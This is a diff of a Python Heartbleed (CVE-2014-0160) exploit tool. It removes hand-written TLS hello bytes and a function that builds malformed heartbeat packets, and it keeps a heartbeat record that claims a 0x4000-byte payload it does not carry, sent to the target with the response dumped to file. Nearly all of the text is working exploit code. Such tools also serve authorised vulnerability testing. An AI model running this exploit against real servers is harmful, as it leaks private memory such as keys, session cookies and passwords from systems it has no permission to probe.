@@ -34,99 +34,6 @@ options.add_option('-x', '--xmpp', action='store_true', default=False, help='Che
 options.add_option('-t', '--hostname', dest='hostname', help='Use given host name in XMPP,Proxy CONNECT') # --""--
 options.add_option('--dump-file', default='', help='dump file filename (default:response.dat')			  # --""--
 
-def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
-
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01
-''')
-
-"""
-SAMPLE:
-hb = h2bin('''
-18 03 02 00 03
-01 40 00
-''')
-"""
-
-
-
-def build_hb(htype=0x01, length=0x4000, payload="A", nofixtlslen=False, nopadding=False, tls_version="1.1"):
-    '''
-    REF: https://tools.ietf.org/html/rfc6520
-       struct {
-              HeartbeatMessageType type;                //0x01 request, 0x02 response, 0x03-0xff reserved
-              uint16 payload_length;                    //len(payload)
-              opaque payload[HeartbeatMessage.payload_length];    //payload data
-              opaque padding[padding_length];                     //padding
-       } HeartbeatMessage;
-    
-    '''
-    tls={
-        'version':
-            {
-            '1.0':0x301,		
-            '1.1':0x302,
-            },
-        }
-			
-    if length>0x4000:
-        print "[ *] [TCP] [TLS] [HB]! HBLength is greater than max. TLS fragment size (16K). Do not expect responses > 16K from the server.\n"
-    print "[ *] [TCP] [TLS] [HB] creating TLS (v%s) HB packet: type=0x%x length=0x%x (%u) payload=%s (len:%u)"%(tls_version,htype,length,length,repr(payload),len(payload))
-    sys.stdout.flush()
-    # build hb packet w type, with defined length and payload
-    p = ""
-
-    #p+= h2bin("18 03 02 00 03")        # SSL TLS1
-    p+= struct.pack("!B",0x18)          # TLS: Content-type: heartbeat
-
-    p+= struct.pack("!H",tls['version'].get(tls_version))        # Version: default TLS 1.1
-                                        # record length: len(htype)+len(length)+len(payload)
-                                        
-    tlslen=1+2       
-    padding = ''                        # minimum of 16bytes padding           
-                                        # padding TLSPlaintext.length - payload_length - 3    
-    if not nofixtlslen:
-        tlslen+=len(payload)
-        
-        if not nopadding:
-            padd_len = tlslen-len(payload) -3
-            if padd_len <16:
-                padd_len = 16           # padd min
-            
-            tlslen+=padd_len
-            padding = 'P'*padd_len
-    else:
-        print "[ *] [TCP] [TLS] not fixing TLS.record.length!"
-    print "[ *] [TCP] [TLS] TLS.record.length = %s"%tlslen
-    sys.stdout.flush()
-        
-    p+= struct.pack("!H",tlslen)        #tls.record.length
-            
-    p+= struct.pack("!B",htype)         #heartbeat type: 1=message
-    p+= struct.pack("!H",length)        #payload length
-    p+= payload
-    p+= padding
-    print "[ *] [TCP] sending: "
-    hexdump_squashed(p)
-
-    return p
-
-
 
 def hexdump_squashed(s):
     for b in xrange(0, len(s), 16):
@@ -211,8 +118,6 @@ def main():
         return
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-
-
     if len(opts.proxy):
         ip,port = opts.proxy.split(":")
         port=int(port)
@@ -287,11 +192,6 @@ def main():
     print '[ *] [TCP] [TLS] Sending heartbeat request...'
     sys.stdout.flush()
 
-    tls_version="1.0" if opts.tls10 else "1.1"
-    
-    #
-    #hb = build_hb(length=opts.hblen, payload=opts.hbload, nofixtlslen=opts.nofixtlslen, nopadding=opts.nopadding, tls_version=tls_version)
-  
     hb = x.TLSRecord(version=0x0302)/x.TLSHeartBeat( payload_length=0x4000)
     hb = x.serialize(hb)
     hexdump_squashed(hb)
